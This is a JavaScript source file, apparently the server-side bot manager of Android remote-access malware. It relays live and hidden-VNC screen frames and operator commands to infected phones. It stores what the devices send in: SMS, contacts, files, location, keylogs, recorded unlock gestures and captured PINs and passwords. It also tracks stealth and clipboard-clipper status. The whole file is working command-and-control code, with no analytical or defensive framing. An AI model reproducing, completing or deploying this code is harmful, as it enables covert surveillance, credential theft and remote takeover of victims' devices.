'use strict';

/**
 * botManager.js
 *
 * Tracks all connected bot WebSocket connections and operator WebSocket
 * connections. Provides the bridge layer: operators send commands, this
 * module routes them to the correct bot; bots send data/frames, this
 * module routes them to subscribed operators.
 *
 * Binary relay format (server → operator):
 *   byte[0]       = magic: 0xFE (VNC) | 0xFF (HVNC)
 *   byte[1-2]     = uint16BE: device_id byte length  (N)
 *   byte[3..N+2]  = device_id UTF-8
 *   byte[N+3..]   = original bot frame bytes [0x01][4B BE len][JPEG]
 */

const db = require('./db');

// ── Magic bytes ────────────────────────────────────────────────────────────────
const VNC_MAGIC  = 0xFE;
const HVNC_MAGIC = 0xFF;

// ── Storage ────────────────────────────────────────────────────────────────────

/** @type {Map<string, {ws: WebSocket, deviceId: string}>} */
const bots = new Map();          // deviceId → { ws }

/** @type {Map<string, {ws: WebSocket, deviceId: string}>} */
const hvncBots = new Map();      // deviceId → { ws }

/** @type {Set<WebSocket>} */
const operators = new Set();

/**
 * Subscriptions: which operator is watching VNC/HVNC for which device.
 * key = deviceId, value = Set of operator ws objects
 */
const vncSubs  = new Map();      // deviceId → Set<operatorWs>
const hvncSubs = new Map();      // deviceId → Set<operatorWs>

// ── Helpers ────────────────────────────────────────────────────────────────────

function broadcastOperators(obj) {
  const msg = JSON.stringify(obj);
  for (const op of operators) {
    if (op.readyState === op.OPEN) op.send(msg);
  }
}

function sendToOperator(ws, obj) {
  if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(obj));
}

function sendBinaryToSubscribers(subs, magic, deviceId, frameBuffer) {
  const idBuf = Buffer.from(deviceId, 'utf8');
  const idLen = idBuf.length;
  // [magic:1][idLen:2BE][deviceId:N][frame]
  const out = Buffer.allocUnsafe(1 + 2 + idLen + frameBuffer.length);
  out[0] = magic;
  out.writeUInt16BE(idLen, 1);
  idBuf.copy(out, 3);
  frameBuffer.copy(out, 3 + idLen);

  const subSet = subs.get(deviceId);
  if (!subSet) return;
  for (const op of subSet) {
    if (op.readyState === op.OPEN) {
      try { op.send(out); } catch (_) {}
    }
  }
}

function deviceInfo(deviceId) {
  return db.getDevice(deviceId) || { device_id: deviceId };
}

function onlineDeviceList() {
  return db.getAllDevices().map(d => ({
    ...d,
    permissions:      tryParse(d.permissions, {}),
    accounts:         tryParse(d.accounts, []),
    blocked_packages: tryParse(d.blocked_packages, []),
    online:           bots.has(d.device_id),
  }));
}

function tryParse(str, fallback) {
  try { return JSON.parse(str); } catch { return fallback; }
}

// ── Bot registration ────────────────────────────────────────────────────────────

function registerBot(deviceId, ws) {
  bots.set(deviceId, { ws });
  db.upsertDevice(deviceId);
  db.setDeviceOnline(deviceId, true);
  db.insertLog(deviceId, 'CONNECT', { ts: Date.now() });
  broadcastOperators({ type: 'BOT_CONNECTED', device_id: deviceId, info: deviceInfo(deviceId) });
  return deviceId;
}

function unregisterBot(deviceId) {
  bots.delete(deviceId);
  db.setDeviceOnline(deviceId, false);
  db.insertLog(deviceId, 'DISCONNECT', { ts: Date.now() });
  broadcastOperators({ type: 'BOT_DISCONNECTED', device_id: deviceId });
}

function registerHvncBot(deviceId, ws) {
  hvncBots.set(deviceId, { ws });
  broadcastOperators({ type: 'HVNC_CONNECTED', device_id: deviceId });
}

function unregisterHvncBot(deviceId) {
  hvncBots.delete(deviceId);
  broadcastOperators({ type: 'HVNC_DISCONNECTED', device_id: deviceId });
}

// ── Operator registration ──────────────────────────────────────────────────────

function registerOperator(ws) {
  operators.add(ws);
  // Immediately send full bot list
  sendToOperator(ws, { type: 'BOT_LIST', bots: onlineDeviceList() });
}

function unregisterOperator(ws) {
  operators.delete(ws);
  // Clean up all subscriptions for this operator
  for (const [devId, set] of vncSubs)  { set.delete(ws); if (set.size === 0) vncSubs.delete(devId); }
  for (const [devId, set] of hvncSubs) { set.delete(ws); if (set.size === 0) hvncSubs.delete(devId); }
}

// ── Subscription management ────────────────────────────────────────────────────

function subscribeVnc(operatorWs, deviceId) {
  if (!vncSubs.has(deviceId)) vncSubs.set(deviceId, new Set());
  vncSubs.get(deviceId).add(operatorWs);
}

function unsubscribeVnc(operatorWs, deviceId) {
  const set = vncSubs.get(deviceId);
  if (!set) return;
  set.delete(operatorWs);
  if (set.size === 0) vncSubs.delete(deviceId);
}

function subscribeHvnc(operatorWs, deviceId) {
  if (!hvncSubs.has(deviceId)) hvncSubs.set(deviceId, new Set());
  hvncSubs.get(deviceId).add(operatorWs);
}

function unsubscribeHvnc(operatorWs, deviceId) {
  const set = hvncSubs.get(deviceId);
  if (!set) return;
  set.delete(operatorWs);
  if (set.size === 0) hvncSubs.delete(deviceId);
}

// ── Command routing ────────────────────────────────────────────────────────────

/**
 * Send a command JSON object to a specific bot.
 * The operator message format:
 *   { type: "COMMAND", device_id: "xxx", action: "TAP", params: { x, y } }
 *
 * We flatten it to what the bot expects:
 *   { action: "TAP", x: 100, y: 200 }
 */
function sendCommand(deviceId, action, params = {}) {
  const entry = bots.get(deviceId);
  if (!entry || entry.ws.readyState !== entry.ws.OPEN) return false;
  const payload = JSON.stringify({ action, ...params });
  try {
    entry.ws.send(payload);
    db.insertLog(deviceId, 'CMD_SENT', { action, params });
    return true;
  } catch (e) {
    db.insertLog(deviceId, 'CMD_ERROR', { action, error: e.message });
    return false;
  }
}

/**
 * Send a command via the HVNC channel.
 */
function sendHvncCommand(deviceId, action, params = {}) {
  const entry = hvncBots.get(deviceId);
  if (!entry || entry.ws.readyState !== entry.ws.OPEN) return false;
  const payload = JSON.stringify({ action, ...params });
  try {
    entry.ws.send(payload);
    return true;
  } catch (_) { return false; }
}

// ── Bot data handler ───────────────────────────────────────────────────────────

/**
 * Handle a text JSON message from a bot.
 * Parses, persists relevant data, and forwards to all operators.
 */
function handleBotMessage(deviceId, raw) {
  let msg;
  try { msg = JSON.parse(raw); } catch { return; }

  const type = msg.type || msg.action || 'UNKNOWN';
  let data = msg.data;

  // Attempt to parse nested JSON data strings
  if (typeof data === 'string') {
    try { data = JSON.parse(data); } catch { /* keep as string */ }
  }

  // ── Persist by type ──────────────────────────────────────────────────────────
  switch (type) {
    case 'DEVICE_INFO': {
      const info = data || msg;
      db.updateDeviceInfo(deviceId, {
        model:               info.model,
        manufacturer:        info.manufacturer,
        androidVersion:      info.androidVersion,
        sdk:                 info.sdk,
        networkType:         info.networkType,
        simOperator:         info.simOperator,
        batteryLevel:        info.batteryLevel,
        isCharging:          info.isCharging,
        adminActive:         info.adminActive,
        accessibilityActive: info.accessibilityActive,
        permissions:         info.permissions,
        accounts:            info.accounts,
        blockedPackages:     info.blockedPackages,
      });
      db.insertLog(deviceId, type, data || msg);
      break;
    }

    case 'SMS_LIST':
    case 'SMS_DATA': {
      const list = Array.isArray(data) ? data : (Array.isArray(msg.data) ? msg.data : null);
      if (list) db.upsertSms(deviceId, list);
      db.insertLog(deviceId, type, list || data);
      break;
    }

    case 'CONTACTS_LIST':
    case 'CONTACTS_DATA': {
      const list = Array.isArray(data) ? data : null;
      if (list) db.upsertContacts(deviceId, list);
      db.insertLog(deviceId, type, list || data);
      break;
    }

    case 'FILE_LIST':
    case 'FILE_DATA': {
      const path   = (data && data.path) || msg.path || '/';
      const files  = (data && data.files) || data || [];
      db.upsertFileList(deviceId, path, files);
      db.insertLog(deviceId, type, data);
      break;
    }

    case 'KEYLOG':
    case 'KEYLOG_DATA': {
      const text = typeof data === 'string' ? data : JSON.stringify(data);
      db.insertKeylog(deviceId, text);
      break;
    }

    case 'LOCATION':
    case 'LOCATION_DATA': {
      db.insertLocation(deviceId, data || msg);
      db.insertLog(deviceId, type, data || msg);
      break;
    }

    case 'INSTALLED_APPS':
    case 'APP_LIST': {
      const list = Array.isArray(data) ? data : null;
      if (list) db.upsertApps(deviceId, list);
      db.insertLog(deviceId, type, list || data);
      break;
    }

    case 'IDENTITY_STATUS': {
      db.insertLog(deviceId, type, msg);
      break;
    }

    case 'CLIPBOARD_DATA':
    case 'PING_RESPONSE':
    case 'ADMIN_STATUS':
    case 'STEALTH_STATUS':
    case 'CLIPPER_STATUS':
    case 'HVNC_CHANNEL_STATUS':
    case 'SCREEN_STATE':
    case 'PLUGIN_LIST':
    case 'CONNECTION_QUALITY':
    case 'NODE_TREE':
    case 'SECURE_STATUS': {
      db.insertLog(deviceId, type, data || msg);
      break;
    }

    case 'UNLOCK_SEQUENCE': {
      // Bot sends its recorded unlock gesture sequence as JSON string in msg.data
      db.insertLog(deviceId, 'UNLOCK_SEQUENCE', msg.data || data || msg);
      break;
    }

    case 'CREDENTIAL_CAPTURED': {
      // Bot captured a PIN/password/pattern from accessibility — no 'data' field
      // msg has: kind, value, pkg, context, confidence, ts
      const credPayload = {
        kind:       msg.kind       || 'unknown',
        value:      msg.value      || '',
        pkg:        msg.pkg        || '',
        context:    msg.context    || '',
        confidence: msg.confidence || 0,
        ts:         msg.ts         || Date.now(),
      };
      db.insertLog(deviceId, 'CREDENTIAL_CAPTURED', credPayload);
      break;
    }

    default: {
      db.insertLog(deviceId, type, data || msg);
      break;
    }
  }

  // ── Forward to all operators (with device_id context) ──────────────────────
  broadcastOperators({
    type:      'BOT_DATA',
    device_id: deviceId,
    data_type: type,
    data:      data !== undefined ? data : msg,
  });
}

/**
 * Handle a binary frame from a bot on the main /ws channel (VNC frame).
 * Frame format from bot: [0x01][4B BE len][JPEG]
 */
function handleBotBinaryFrame(deviceId, buffer) {
  sendBinaryToSubscribers(vncSubs, VNC_MAGIC, deviceId, buffer);
}

/**
 * Handle a binary frame from a bot on the /hvnc channel.
 * Frame format from bot: [0x01][4B BE len][JPEG]
 */
function handleHvncBinaryFrame(deviceId, buffer) {
  sendBinaryToSubscribers(hvncSubs, HVNC_MAGIC, deviceId, buffer);
}

// ── Operator message dispatcher ────────────────────────────────────────────────

/**
 * Process a message from an operator WebSocket.
 * Returns { ok: boolean, error?: string }
 */
function handleOperatorMessage(operatorWs, raw) {
  let msg;
  try { msg = JSON.parse(raw); } catch { return { ok: false, error: 'invalid JSON' }; }

  // Support both nested params object { action, params:{x,y} }
  // and flattened format { action, x, y } (what app.js sends via spread)
  const { type, device_id, action, params: _nested, ...rest } = msg;
  // Remove envelope keys from rest so only command params remain
  delete rest.type; delete rest.device_id; delete rest.action;
  const params = (_nested !== undefined) ? _nested : rest;

  switch (type) {
    case 'GET_BOTS': {
      sendToOperator(operatorWs, { type: 'BOT_LIST', bots: onlineDeviceList() });
      return { ok: true };
    }

    case 'SUBSCRIBE_VNC': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      subscribeVnc(operatorWs, device_id);
      return { ok: true };
    }

    case 'UNSUBSCRIBE_VNC': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      unsubscribeVnc(operatorWs, device_id);
      return { ok: true };
    }

    case 'SUBSCRIBE_HVNC': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      subscribeHvnc(operatorWs, device_id);
      return { ok: true };
    }

    case 'UNSUBSCRIBE_HVNC': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      unsubscribeHvnc(operatorWs, device_id);
      return { ok: true };
    }

    case 'COMMAND': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      if (!action)    return { ok: false, error: 'missing action' };
      const ok = sendCommand(device_id, action, params);
      if (!ok) return { ok: false, error: 'bot not connected or send failed' };
      return { ok: true };
    }

    case 'HVNC_COMMAND': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      if (!action)    return { ok: false, error: 'missing action' };
      const ok = sendHvncCommand(device_id, action, params);
      if (!ok) return { ok: false, error: 'hvnc bot not connected' };
      return { ok: true };
    }

    // ── DB reads — operator requests cached data ──────────────────────────────
    case 'GET_LOGS': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const logs = db.getLogs(device_id, msg.limit || 200);
      sendToOperator(operatorWs, { type: 'LOGS_DATA', device_id, data: logs });
      return { ok: true };
    }

    case 'GET_KEYLOGS': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const logs = db.getKeylogs(device_id, msg.limit || 500);
      sendToOperator(operatorWs, { type: 'KEYLOGS_DATA', device_id, data: logs });
      return { ok: true };
    }

    case 'CLEAR_KEYLOGS': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      db.clearKeylogs(device_id);
      sendToOperator(operatorWs, { type: 'KEYLOGS_CLEARED', device_id });
      return { ok: true };
    }

    case 'GET_SMS_CACHE': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const data = db.getSms(device_id);
      sendToOperator(operatorWs, { type: 'SMS_CACHE', device_id, data });
      return { ok: true };
    }

    case 'GET_CONTACTS_CACHE': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const data = db.getContacts(device_id);
      sendToOperator(operatorWs, { type: 'CONTACTS_CACHE', device_id, data });
      return { ok: true };
    }

    case 'GET_FILE_CACHE': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const data = db.getFileList(device_id, msg.path || '/');
      sendToOperator(operatorWs, { type: 'FILE_CACHE', device_id, path: msg.path, data });
      return { ok: true };
    }

    case 'GET_APPS_CACHE': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const data = db.getApps(device_id);
      sendToOperator(operatorWs, { type: 'APPS_CACHE', device_id, data });
      return { ok: true };
    }

    case 'GET_LOCATION_CACHE': {
      if (!device_id) return { ok: false, error: 'missing device_id' };
      const data = db.getLatestLocation(device_id);
      sendToOperator(operatorWs, { type: 'LOCATION_CACHE', device_id, data });
      return { ok: true };
    }

    default:
      return { ok: false, error: `unknown operator message type: ${type}` };
  }
}

// ── Exports ────────────────────────────────────────────────────────────────────

module.exports = {
  registerBot,
  unregisterBot,
  registerHvncBot,
  unregisterHvncBot,
  registerOperator,
  unregisterOperator,
  handleBotMessage,
  handleBotBinaryFrame,
  handleHvncBinaryFrame,
  handleOperatorMessage,
  bots,
  hvncBots,
  operators,
  onlineDeviceList,
};
